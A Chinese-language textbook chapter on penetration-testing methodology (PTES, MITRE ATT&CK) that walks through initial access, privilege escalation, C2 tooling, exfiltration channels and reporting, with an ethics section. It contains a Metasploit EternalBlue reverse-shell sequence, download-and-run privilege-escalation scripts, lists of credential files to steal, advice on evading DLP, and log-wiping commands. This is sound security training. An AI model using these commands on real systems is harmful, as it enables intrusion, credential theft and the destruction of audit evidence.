# 第 8 章 渗透测试方法论

## 8.1 学习目标

1. 掌握主流渗透测试方法论：**PTES / OWASP WSTG / NIST SP 800-115 / OSSTMM / MITRE ATT&CK**。
2. 能独立走完一次渗透测试的七阶段工作流。
3. 熟练使用 Metasploit、C2（如 Sliver / Havoc）进行漏洞利用与后渗透。
4. 建立"授权—不越界—留痕可恢复"的职业伦理。

---

## 8.2 主流方法论

| 方法论 | 定位 | 阶段要点 |
|--------|------|----------|
| **PTES** (Penetration Testing Execution Standard) | 业界最流行 | 前期交互 → 情报收集 → 威胁建模 → 漏洞分析 → 漏洞利用 → 后渗透 → 报告 |
| **OWASP WSTG** | Web 专项 | 信息收集 → 配置管理 → 身份管理 → 认证 → 授权 → 会话 → 输入验证 → 错误处理 → 加密 → 业务逻辑 → 客户端 → API |
| **NIST SP 800-115** | 美国政府规范 | 规划 → 发现 → 攻击 → 报告 |
| **OSSTMM** | 科学化测度 | 操作 / 控制 / 情报等多维 |
| **MITRE ATT&CK** | 战术-技术知识库 | 14 个战术（TA0001~TA0043），600+ 技术 |

### 8.2.1 PTES 七阶段

```
①前期交互 Pre-engagement
    ↓  签 SOW / Rules of Engagement，定范围、时间、紧急联系人
②情报收集 Intelligence Gathering（见 Ch06）
③威胁建模 Threat Modeling
    ↓  STRIDE / 攻击树 / 最关键资产识别
④漏洞分析 Vulnerability Analysis（见 Ch07）
⑤漏洞利用 Exploitation
⑥后渗透 Post-Exploitation
⑦报告 Reporting
```

### 8.2.2 MITRE ATT&CK 战术一览

```
TA0043 Reconnaissance            侦察
TA0042 Resource Development      武器化
TA0001 Initial Access            初始访问
TA0002 Execution                 执行
TA0003 Persistence               持久化
TA0004 Privilege Escalation      提权
TA0005 Defense Evasion           绕过检测
TA0006 Credential Access         凭证窃取
TA0007 Discovery                 内网发现
TA0008 Lateral Movement          横向移动
TA0009 Collection                数据收集
TA0011 Command and Control       命令控制
TA0010 Exfiltration              数据外带
TA0040 Impact                    破坏
```

## 8.3 初始访问（Initial Access）

| 技术 (ATT&CK ID) | 示例 |
|------------------|------|
| T1190 Exploit Public-Facing App | Log4Shell、Spring4Shell |
| T1566 Phishing | 钓鱼邮件附件 / 链接 / 鱼叉 |
| T1078 Valid Accounts | 泄露凭证 / 密码喷洒 |
| T1133 External Remote Services | VPN / RDP / SSH 暴力破解 |
| T1199 Trusted Relationship | 供应链 / 第三方 |

### 8.3.1 密码喷洒 vs 爆破

```
爆破 (Brute force)： 1 用户  × N 密码
喷洒 (Spraying)：   M 用户  × 1 ~ 3 常用密码
喷洒可避免账号锁定，常用于 OWA / O365 / VPN。
```

### 8.3.2 Metasploit 基础

```bash
msfconsole
> workspace -a pentest-demo
> db_nmap -sV -p 80,443,22,3389 target.com
> search type:exploit name:ms17_010
> use exploit/windows/smb/ms17_010_eternalblue
> set RHOSTS 10.0.0.5
> set LHOST 10.0.0.10
> set PAYLOAD windows/x64/meterpreter/reverse_tcp
> exploit
```

### 8.3.3 初始立足点常见思路

1. **外网应用 0day/nday**：扫描 + Nuclei 命中 → Metasploit / 公开 PoC。
2. **凭证泄露**：GitHub / dump / 撞库 → 后台登录。
3. **钓鱼**：GoPhish + CobaltStrike / Sliver 生成 Office Macro / LNK。
4. **VPN/RDP 弱口令**：Hydra / CrackMapExec。

## 8.4 权限提升（Privilege Escalation）

### 8.4.1 Linux

```bash
# 自动化
wget https://raw.githubusercontent.com/carlospolop/PEASS-ng/master/linPEAS/linpeas.sh
bash linpeas.sh

# 常见点
sudo -l                        # sudo 可执行命令
find / -perm -4000 2>/dev/null # SUID
getcap -r / 2>/dev/null        # capabilities
cat /etc/crontab               # cron 提权
uname -a && cat /etc/os-release# 内核提权（DirtyCOW / DirtyPipe）
```

### 8.4.2 Windows

```powershell
# 自动化
iwr winpeas.exe -o w.exe ; .\w.exe

# 常见点
whoami /all                       # 特权
systeminfo                        # 补丁缺失
Get-Service | ? {$_.Status -eq "Running"}
schtasks /query /fo LIST /v       # 计划任务
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"
```

- **Unquoted Service Path**、**AlwaysInstallElevated**、**Token 篡改**、**PrintNightmare**、**CVE-2021-1675** 是经典考点。

### 8.4.3 域提权（AD）

- Kerberoasting → 申请服务票据 → 离线爆破 NTLMv2 哈希。
- AS-REP Roasting → 未设置预认证的账户。
- 不安全 ACL → BloodHound 找 "shortest path to DA"。
- NTLM Relay → 内网 SMB/LDAP 转发。
- ZeroLogon / PetitPotam / NoPac 等 AD 漏洞链。

## 8.6 C2（Command & Control）

| 工具 | 特点 |
|------|------|
| **Cobalt Strike** | 商业 APT 级，Beacon + Malleable C2 Profile（仅授权研究）|
| **Sliver** | 开源，Go 写的 Beacon，支持多协议（HTTPS/DNS/Mutual-TLS）|
| **Havoc** | 开源现代 C2，带精美 GUI |
| **Mythic** | 模块化 C2 框架 |
| **Metasploit / Meterpreter** | 入门友好 |

### 8.6.1 Beacon 基本特征

- 周期性心跳（sleep 10s ± jitter 30%）
- 域前置 / CDN 伪装
- `Malleable C2 profile` 可自定义 UA / URI / 指纹
- 加密通道（mTLS / AES-GCM）

## 8.7 数据收集与外带

### 8.7.1 常见敏感数据

- 域控：`NTDS.dit` + `SYSTEM` hive → 离线解密所有域账户哈希
- 浏览器：Cookies / LocalStorage / 保存密码
- SSH / Git 凭证：`~/.ssh/id_rsa`、`~/.git-credentials`
- 云凭证：`~/.aws/credentials`、`~/.azure/`
- IM：企业微信 / 钉钉 sqlite

### 8.7.2 外带通道

| 通道 | 示例 |
|------|------|
| HTTPS | 伪装成静态资源 POST |
| DNS | `iodine`、`dnscat2` |
| ICMP | `icmp-tunnel`（小包低速） |
| OOB | Burp Collaborator、`interact.sh` |
| 合法云盘 | Dropbox / Drive / OneDrive 误用 |

> 外带必须分 chunk、加密、限速，避免触发 DLP。

## 8.8 后渗透与痕迹清理

```bash
# Linux 痕迹
unset HISTFILE ; export HISTSIZE=0
echo "" > ~/.bash_history
rm -rf /var/log/*.log  # ← 实战中请 **不要** 真的清，改成 "置换最后若干行" 更隐蔽

# Windows
wevtutil cl Security
wevtutil cl System
```

> **重要**：授权测试结束后应协助客户 **恢复环境**（删除账户、移除后门、撤销 token、清 C2），而不是留坑。

## 8.9 测试报告模板

```
封面：客户 / 测试范围 / 时间 / 版本
1. 执行摘要（给管理层，1 页）
   - 关键发现 + 风险结论 + 修复优先级
2. 测试范围与方法
3. 漏洞列表（按风险排序）
   每项：编号 / 标题 / CVSS / 位置 / 复现 / 证据 / 影响 / 修复建议
4. 攻击路径复盘（图示）
   外网打点 → 提权 → 横向 → 达到目标资产
5. 防御建议（ATT&CK 映射）
6. 附录：工具版本、日志、脚本
```

## 8.10 合规与伦理红线

1. **授权书（SOW / ROE）** 必须覆盖：范围、时间、禁入系统、紧急联系人、取证留痕要求。
2. **最小化原则**：能拿到证明漏洞存在的最小样本，就不要批量 dump 数据。
3. **不修改业务数据**：只读 > 少量写 > 绝不删除 / 加密。
4. **不发布未授权成果**：CTF 之外的漏洞披露，走 RVD / CNVD / CNA 负责任披露流程。
5. 相关法律：《网络安全法》《数据安全法》《个人信息保护法》，美国 CFAA，欧盟 GDPR。

## 8.12 小结

真正的渗透能力 = 方法论 × 工具熟练度 × 内网知识 × 报告力。
没有"炫技"，只有"可复现 + 可修复 + 可解释"的发现。
